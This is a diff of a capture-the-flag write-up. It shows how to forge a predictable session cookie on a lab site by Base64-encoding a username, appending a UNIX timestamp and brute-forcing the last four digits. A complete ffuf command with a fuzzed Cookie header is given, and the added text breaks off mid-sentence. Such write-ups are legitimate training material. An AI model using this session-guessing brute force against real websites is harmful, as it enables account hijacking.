@@ -33,10 +33,13 @@ Use CyberChef and encode the username Marlov and timestamp to where we think he 
 Marlow - Base64 - TWFybG93
 14 November 2024 11:53:00 UTC - UNIX Timestamp - 1731585180
 
-And since we expect that Marlow logged in a bit earlier than writing his message, we will use the last four digits of the UNIX Timestamp for brute forcing his total CookieId using ffuf and a number list with leading zeroes. (Filter out size=2253)
+And since we expect that Marlow logged in a bit earlier than writing his message, we will use the last four digits of the UNIX Timestamp for brute forcing his total CookieId using ffuf and a number list with leading zeroes from 0000-9999 (9999 seconds equaling 2.7 hours).
 
 ffuf -u http://koala.hackingarena.no:803/messages.php -H "Cookie: CalypId=TWFybG93173158FUZZ" -w /home/kali/Desktop/leading_zeroes.txt -fs 2253
 
+![[Pasted image 20241115223648.png]]
+
+Lastly, curl the website with Marlow's activ
 # Additional Info
 
 Additional solution / info
